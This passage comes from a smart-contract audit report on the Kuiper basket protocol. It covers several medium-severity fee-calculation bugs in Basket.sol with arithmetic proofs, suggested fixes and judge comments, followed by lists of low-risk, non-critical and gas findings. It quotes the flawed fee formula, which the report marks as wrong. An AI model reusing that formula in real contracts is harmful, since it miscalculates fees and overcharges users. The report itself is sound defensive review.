3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We want to firstly do all multiplication and lastly do all the division.\nSo remove the usage of feePct and instead set fee to be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">startSupply</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">licenseFee</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">timeDiff</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">ONE_YEAR</span><span class=\"mtk1\"> / (</span><span class=\"mtk12\">BASE</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">licenseFee</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/60\">frank-beard (Kuiper) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/60#issuecomment-1079826919\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Nice find! I think this qualifies as <code>medium</code> risk due to the protocol regularly leaking value. This can be mitigated by performing division at the very end of the fee calculation.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-baskethandlefees-fee-calculation-is-wrong\" style=\"position:relative;\"><a href=\"#m-09-baskethandlefees-fee-calculation-is-wrong\" aria-label=\"m 09 baskethandlefees fee calculation is wrong permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/43\">[M-09] <code>Basket:handleFees</code> fee calculation is wrong</a></h2>\n<p><em>Submitted by GiveMeTestEther</em></p>\n<p>The fee calculation on L141 is wrong. It should only get divided by BASE and not (BASE - feePct)</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This shows dividing only by BASE is correct:<br>\nAssumptions:</p>\n<ul>\n<li>BASE is 1e18 accordign to the code</li>\n<li>timeDiff is exactly ONE_YEAR (for easier calculations)</li>\n<li>startSupply is 1e18 (exactly one basket token, also represents 100% in fee terms)</li>\n<li>licenseFee is 1e15 (0.1%)</li>\n</ul>\n<p>If we calculate the fee of one whole year and startSupply is one token (1e18, equal to 100%), the fee should be exactly the licenseFee  (1e15, 0.1%),</p>\n<p>uint256 timeDiff = ONE<em>YEAR;<br>\nuint256 feePct = timeDiff * licenseFee / ONE</em>YEAR;<br>\n=> therefore we have: feePct = licenseFee which is 1e15 (0.1%) according to our assumptions<br>\nuint256 fee = startSupply * feePct / BASE; // only divide by BASE<br>\n=> insert values => fee = 1e18 * licenseFee  / 1e18 = licenseFee</p>\n<p>This shows the math is wrong:</p>\n<p>Assumptions:</p>\n<ul>\n<li>BASE is 1e18 according to the code</li>\n<li>timeDiff is exactly ONE_YEAR (for easier calculations)</li>\n<li>startSupply is 1e18 (exactly one basket token, also represents 100% in fee terms)</li>\n<li>licenseFee is 1e15 (0.1%)</li>\n</ul>\n<p>If we calculate the fee of one whole year and startSupply is one token (1e18, equal to 100%), the fee should be exactly the licenseFee  (1e15, 0.1%), but the fee is bigger than that.</p>\n<p>uint256 timeDiff = ONE<em>YEAR;<br>\nuint256 feePct = timeDiff * licenseFee / ONE</em>YEAR;<br>\n=> therefore we have: feePct = licenseFee which is 1e15 (0.1%) according to our assumptions</p>\n<p>uint256 fee = startSupply * feePct / (BASE - feePct);<br>\ninsert the values => fee = 1e18 * 1e15 / (1e18 - 1e15) => (factor out 1e15) => fee = 1e15 * 1e18 / (1e15 * ( 1e3 - 1) => (cancel 1e15) => 1e18 / ( 1e3 - 1)</p>\n<p>math: if we increase the divisor but the dividend stays the same we get a smaller number e.g. (1 / (2-1)) is bigger than (1 / 2)<br>\napply this here => 1e18 / ( 1e3 - 1) > 1e18 / 1e3 => 1e18 / ( 1e3 - 1) > 1e15  this shows that the fee is higher than 1e15</p>\n<p><a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L133\">Basket.sol#L133</a><br>\n<a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L141\">Basket.sol#L141</a></p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Only divide by BASE.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/43\">frank-beard (Kuiper) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/43#issuecomment-1079828004\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think this is valid. Calculating fees as <code>startSupply * feePct / (BASE - feePct)</code> leads to an overestimation of fees charged on users.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-fee-calculation-is-slightly-off\" style=\"position:relative;\"><a href=\"#m-10-fee-calculation-is-slightly-off\" aria-label=\"m 10 fee calculation is slightly off permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/152\">[M-10] Fee calculation is slightly off</a></h2>\n<p><em>Submitted by gzeon</em></p>\n<p>The fee calculation</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeDiff</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">lastFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feePct</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">timeDiff</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">licenseFee</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">ONE_YEAR</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">startSupply</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">feePct</span><span class=\"mtk1\"> / (</span><span class=\"mtk12\">BASE</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">feePct</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>tries to calculate a fee such that fee/(supply+fee) = %fee using a simple interest formula (i.e. no compounding), this lead to slightly less fee collected when fee are collected more frequently (small timeDiff) vs less frequently (big timeDiff).</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L133\">Basket.sol#L133</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/152#issuecomment-1048146206\">frank-beard (Kuiper) acknowledged, but disagreed with Medium severity and commented</a>:</strong></p>\n<blockquote>\n<p>While this is technically true, the actual precision loss should be very negligible.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/152#issuecomment-1079829640\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think any precision loss or value leakage qualifies for a <code>medium</code> severity issue. This seems like it would lead to an inconsistent fee calculation and is probably worthwhile fixing long-term.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-baskethandlefees-fees-are-overcharged\" style=\"position:relative;\"><a href=\"#m-11-baskethandlefees-fees-are-overcharged\" aria-label=\"m 11 baskethandlefees fees are overcharged permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/170\">[M-11] <code>Basket:handleFees():</code> fees are overcharged</a></h2>\n<p><em>Submitted by GiveMeTestEther</em></p>\n<p>The fee calculation is based on the totalSupply of the basket token. But some amount of the totalSupply represents the fees paid to the publisher/ protocol owner. Therefore the fees are “overcharged”:  because the fee amount is calculated on a part of already “paid” fees, should only take into account what is “owned”\nby the users and not the publisher/protocol owner.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>L141: the fee percent is multiplied by startSupply (=basket token total supply)<br>\nL144 &#x26; L145: publisher / protocol owner receive basket tokens as fees payment<br>\n<a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Basket.sol#L141\">Basket.sol#L141</a></p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>account the fee amount in a storage variable: uint256 feeAmount;</li>\n<li>subtract feeAmount from startSupply L141: uint256 fee = (startSupply - feeAmount) * feePct / (BASE - feePct); // note the other bug about only dividing by BASE</li>\n<li>add the fee to feeAmount after the calculation:  feeAmount += fee;</li>\n<li>if publisher/protocol owner burn basket token, reduce the feeAmount etc.</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/170#issuecomment-1049062352\">frank-beard (Kuiper) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Generally we think that the amount of overcharged fees from this matter will be very negligible in the long term. It is worth noting that the fix proposed would not really solve the problem as not all tokens owned by the publisher/owner may be fees as well as they could just transfer those fees to another account and burn from there.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/170#issuecomment-1079820186\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I’m not sure if this is correct. <code>startSupply</code> is indeed equal to <code>totalSupply()</code> but it is queried before new tokens are minted to the factory owner and publisher. As such, the fees appear to be correctly charged. I’ll have @frank-beard confirm this as I may have missed something.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/170#issuecomment-1087492580\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Considering @frank-beard has not replied to this, I’m gonna make the final judgement and keep this open. I think it makes sense to track the fees paid out to the factory owner and publisher and have this amount excluded from the fee calculations. Upon either party burning tokens, this fee amount tracker must be updated accordingly. Due to the added complexity, it is understandable that this issue would be deemed a wontfix by the sponsor.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/170#issuecomment-1087614572\">frank-beard (Kuiper) commented</a>:</strong></p>\n<blockquote>\n<p>Yeah so I do agree that it does make sense generally to track the fees paid out and exclude, however in this case the impact is very low and yeah the complexity to deal with it doesn’t seem worth it.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-findings-8\" style=\"position:relative;\"><a href=\"#low-risk-findings-8\" aria-label=\"low risk findings 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk Findings (8)</h1>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/137\">[L-01] Extra payments for an auction gets stucks</a> <em>Submitted by 0x0x0x</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/146\">[L-02] <code>maxSupply</code> can be exceeded</a> <em>Submitted by 0x0x0x</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/56\">[L-03] Bonding doesn’t seem to perform any meaningful role and leads to inefficient auctions</a> <em>Submitted by TomFrenchBlockchain</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/150\">[L-04] Factory can block auctions</a> <em>Submitted by 0x0x0x</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/103\">[L-05] <code>Basket.sol</code> Pending licenseFee may unable to be canceled when current licenseFee is <code>0</code></a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/104\">[L-06] <code>Basket.sol</code> should use the Upgradeable variant of OpenZeppelin Contracts</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/97\">[L-07] <code>Basket.sol#changeLicenseFee()</code> Unable to set <code>licenseFee</code> to 0</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/33\">[L-08] changeLicenseFee() and fees for previous period</a> <em>Submitted by gpersoon</em></li>\n</ul>\n<h1 id=\"non-critical-findings-29\" style=\"position:relative;\"><a href=\"#non-critical-findings-29\" aria-label=\"non critical findings 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical Findings (29)</h1>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/135\">[N-01] TODO comments should be resolved </a> <em>Submitted by Jujic, also found by hagrid, Meta0xNull, and robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/30\">[N-02] <code>Ownable</code> Contract Does Not Implement Two-Step Transfer Ownership Pattern</a> <em>Submitted by hagrid</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/31\">[N-03] Missing Revert Messages</a> <em>Submitted by hagrid, also found by robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/177\">[N-04] Use of deprecated <code>safeApprove()</code> function</a> <em>Submitted by broccolirob, also found by GiveMeTestEther, gzeon, Meta0xNull, robee, and sirhashalot</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/27\">[N-05] Not verified function inputs of public / external functions</a> <em>Submitted by robee</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/50\">[N-06] Incorrent visibility for “initialized” variable</a> <em>Submitted by neslinesli93</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/134\">[N-07] <code>BasketLicenseProposed</code> better emit proposal id</a> <em>Submitted by gzeon</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/83\">[N-08] setAuctionDecrement() Lack of Input Validation May Break Other Function</a> <em>Submitted by Meta0xNull, also found by gpersoon</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/82\">[N-09] setAuctionMultiplier() Lack of Input Validation May Break Other Function</a> <em>Submitted by Meta0xNull, also found by gpersoon</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/88\">[N-10] Broken unit tests due to incorrect values</a> <em>Submitted by bw</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/115\">[N-11] <code>NewIndexSubmitted</code> event is not emitted in some case</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/44\">[N-12] Factory:setOwnerSplit owner fee split can be set to exactly 20%</a> <em>Submitted by GiveMeTestEther</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/32\">[N-13] Emit for publishNewIndex / killAuction part</a> <em>Submitted by gpersoon</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/10\">[N-14] Use of Require statement without reason message</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/12\">[N-15] Remove override keyword from Auction</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/13\">[N-16] Remove override keyword from Basket</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/15\">[N-17] Lack of event indexing</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/8\">[N-18] Lack of input verification</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/9\">[N-19] Remove override keyword</a> <em>Submitted by 0x1f8b</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/6\">[N-20] Lack of message in require statments</a> <em>Submitted by BouSalman</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/5\">[N-21] Lack of revert reason strings</a> <em>Submitted by TomFrenchBlockchain</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/111\">[N-22] <code>Factory.sol</code> Lack of two-step procedure and/or input validation routines for critical operations leaves them error-prone</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/112\">[N-23] Critical operations should emit events</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/90\">[N-24] Outdated compiler version</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/93\">[N-25] Missing error messages in require statements</a> <em>Submitted by WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/62\">[N-26] Wrong syntax in test leads to wrong test results</a> <em>Submitted by kenzo</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/76\">[N-27] Unnecessary variable initialization and TODO in code</a> <em>Submitted by neslinesli93</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/77\">[N-28] Possible division by zero in <code>settleAuction</code></a> <em>Submitted by neslinesli93</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/157\">[N-29] Open TODOs</a> <em>Submitted by ye0lde</em></li>\n</ul>\n<h1 id=\"gas-optimizations-40\" style=\"position:relative;\"><a href=\"#gas-optimizations-40\" aria-label=\"gas optimizations 40 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations (40)</h1>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/165\">[G-01] Check for tokenAmount > 0 is missing in pushUnderlying function [basket.sol]</a> <em>Submitted by rishabh</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/139\">[G-02] For uint <code>> 0</code> can be replaced with <code>!= 0</code> for gas optimization</a> <em>Submitted by 0x0x0x, also found by Jujic, pmerkleplant, and ye0lde</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/140\">[G-03] Loops can be implemented more efficiently</a> <em>Submitted by 0x0x0x, also found by Jujic, Meta0xNull, pmerkleplant, rishabh, and WatchPug</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/138\">[G-04] Use negate(!) rather than <code>== false</code></a> <em>Submitted by 0x0x0x, also found by ye0lde</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/120\">[G-05] <code>++i</code> is more efficient than <code>i++</code></a> <em>Submitted by WatchPug, also found by Jujic and pedroais</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/142\">[G-06] <code>mintTo</code> has not an extra require statement</a> <em>Submitted by 0x0x0x, also found by danb and TomFrenchBlockchain</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/110\">[G-07] <code>Basket.sol#handleFees()</code> Check if <code>timeDiff > 0</code> can save gas</a> <em>Submitted by WatchPug, also found by 0x0x0x</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/147\">[G-08] Division with <code>BASE</code> twice can be optimized </a> <em>Submitted by 0x0x0x</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/164\">[G-09] Auction:settleAuction() cache address(basket)</a> <em>Submitted by GiveMeTestEther</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/166\">[G-10] Auction:bondForRebalance() store calculation of bondAmount in local variable</a> <em>Submitted by GiveMeTestEther</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/167\">[G-11] Auction:bondBurn(): cache bondAmount</a> <em>Submitted by GiveMeTestEther</em></li>\n<li><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/122\">[G-12] Cache external call results can save gas</a> <em>Submitted by WatchPug, also found by TomFrenchBlockchain</em></li>\n<li><a 